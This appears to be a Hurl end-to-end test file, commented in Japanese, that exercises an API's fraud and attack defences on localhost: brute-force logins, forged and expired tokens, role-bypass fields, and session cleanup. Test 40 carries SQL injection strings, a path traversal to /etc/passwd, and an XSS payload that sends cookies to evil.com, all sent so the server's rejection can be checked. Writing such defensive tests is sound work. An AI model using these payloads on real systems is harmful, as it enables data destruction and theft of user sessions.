# ========================================
# 高度な不正検知・対策E2Eテストシナリオ
# ========================================
# シナリオ: 包括的な不正行為検出・防止システムのテスト
# - ブルートフォース攻撃の検出と対策
# - 異常なアクセスパターンの監視
# - レート制限の動作確認
# - 不正統計の詳細分析
# - セキュリティイベントの追跡
# - 複数の攻撃ベクターのシミュレーション

# ========================================
# Phase 1: ベースライン確立と正常動作確認
# ========================================

# Test 1: 管理者ログイン（監視システム初期化）
POST http://localhost/api/v1/auth/login
Content-Type: application/json
{
  "email": "admin@example.com",
  "password": "password123"
}

HTTP 200
[Captures]
admin_token: jsonpath "$.data.access_token"
admin_refresh_token: jsonpath "$.data.refresh_token"
[Asserts]
jsonpath "$.data.access_token" exists
jsonpath "$.data.user.email" == "admin@example.com"

# Test 2: 初期統計の取得（ベースライン）
GET http://localhost/api/v1/stats
Authorization: Bearer {{admin_token}}

HTTP 200
[Captures]
initial_stats: jsonpath "$"
[Asserts]
jsonpath "$" exists

# Test 3: 正常ユーザーログイン（比較用）
POST http://localhost/api/v1/auth/login
Content-Type: application/json
{
  "email": "testuser1@example.com",
  "password": "password123"
}

HTTP 200
[Captures]
legitimate_user_token: jsonpath "$.data.access_token"
legitimate_user_id: jsonpath "$.data.user.id"
[Asserts]
jsonpath "$.data.access_token" exists

# Test 4: 正常ユーザーのプロファイルアクセス
GET http://localhost/api/v1/user/profile
Authorization: Bearer {{legitimate_user_token}}

HTTP 200
[Asserts]
jsonpath "$.data.user_id" == {{legitimate_user_id}}

# ========================================
# Phase 2: ブルートフォース攻撃シミュレーション
# ========================================

# Test 5-14: 連続した不正ログイン試行（ブルートフォース攻撃）
POST http://localhost/api/v1/auth/login
Content-Type: application/json
{
  "email": "testuser2@example.com",
  "password": "hack_attempt_001"
}

HTTP 401

# ========================================
# Phase 7: レート制限とアカウントロック
# ========================================

# Test 34: レート制限後の統計確認
GET http://localhost/api/v1/stats
Authorization: Bearer {{admin_token}}

HTTP 200
[Asserts]
jsonpath "$" exists

# Test 35: 正常ユーザーの継続アクセス確認
GET http://localhost/api/v1/user/profile
Authorization: Bearer {{legitimate_user_token}}

HTTP 200
[Asserts]
jsonpath "$.data.user_id" == {{legitimate_user_id}}

# ========================================
# Phase 8: トークン関連攻撃
# ========================================

# Test 36: 無効なトークンでの管理者エンドポイント攻撃
GET http://localhost/api/v1/admin/users
Authorization: Bearer fake_admin_token_12345

HTTP 401
[Asserts]
jsonpath "$.error" exists

# Test 37: 期限切れトークンでの攻撃
GET http://localhost/api/v1/admin/users
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

HTTP 401
[Asserts]
jsonpath "$.error" exists

# Test 38: 不正な形式のトークンでの攻撃
GET http://localhost/api/v1/admin/users
Authorization: Bearer not.a.valid.jwt.token.format

HTTP 401
[Asserts]
jsonpath "$.error" exists

# Test 39: Bearerなしでのトークン攻撃
GET http://localhost/api/v1/admin/users
Authorization: {{admin_token}}

HTTP 401
[Asserts]
jsonpath "$.error" exists

# ========================================
# Phase 9: 複合攻撃パターン
# ========================================

# Test 40: 複数の攻撃手法を組み合わせた攻撃
POST http://localhost/api/v1/auth/login
Content-Type: application/json
{
  "email": "admin@example.com'; DROP TABLE users; SELECT * FROM passwords WHERE '1'='1",
  "password": "' OR 1=1 UNION SELECT password FROM admin_users --",
  "extra_field": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
  "injection_attempt": "../../etc/passwd"
}

HTTP 400
[Asserts]
jsonpath "$.error" exists

# Test 41: 管理者になりすました攻撃
POST http://localhost/api/v1/auth/login
Content-Type: application/json
{
  "email": "admin@example.com",
  "password": "admin",
  "role": "admin",
  "permissions": ["all"],
  "bypass": true
}

HTTP 400
[Asserts]
jsonpath "$.error" exists

# ========================================
# Phase 10: セキュリティ検証とクリーンアップ
# ========================================

# Test 42: 攻撃後の管理者権限確認
GET http://localhost/api/v1/admin/users
Authorization: Bearer {{admin_token}}

HTTP 200
[Asserts]
jsonpath "$.data.users" count >= 8

# Test 43: 攻撃後の正常ユーザー機能確認
GET http://localhost/api/v1/user/profile
Authorization: Bearer {{legitimate_user_token}}

HTTP 200
[Asserts]
jsonpath "$.data.user_id" == {{legitimate_user_id}}

# Test 44: 最終統計の確認
GET http://localhost/api/v1/stats
Authorization: Bearer {{admin_token}}

HTTP 200
[Captures]
final_stats: jsonpath "$"
[Asserts]
jsonpath "$" exists

# Test 45: 管理者パスワード復旧テスト
POST http://localhost/api/v1/user/change-password
Authorization: Bearer {{admin_token}}
Content-Type: application/json
{
  "current_password": "password123",
  "new_password": "new_admin_password_123"
}

HTTP 200
[Asserts]
jsonpath "$.message" exists

# Test 46: 復旧後の管理者ログイン確認
POST http://localhost/api/v1/auth/login
Content-Type: application/json
{
  "email": "admin@example.com",
  "password": "new_admin_password_123"
}

HTTP 200
[Captures]
restored_admin_token: jsonpath "$.data.access_token"
[Asserts]
jsonpath "$.data.access_token" exists

# ========================================
# Phase 11: 最終クリーンアップ
# ========================================

# Test 47: 正常ユーザーログアウト
POST http://localhost/api/v1/user/logout
Content-Type: application/json
Authorization: Bearer {{legitimate_user_token}}

HTTP 200
[Asserts]
jsonpath "$.message" exists

# Test 48: 管理者ログアウト
POST http://localhost/api/v1/user/logout
Content-Type: application/json
Authorization: Bearer {{restored_admin_token}}

HTTP 200
[Asserts]
jsonpath "$.message" exists

# Test 49: 全セッション終了後のアクセス確認
GET http://localhost/api/v1/admin/users

HTTP 401
[Asserts]
jsonpath "$.error" exists

# Test 50: 最終セキュリティ検証
GET http://localhost/api/v1/user/profile

HTTP 401
[Asserts]
jsonpath "$.error" exists
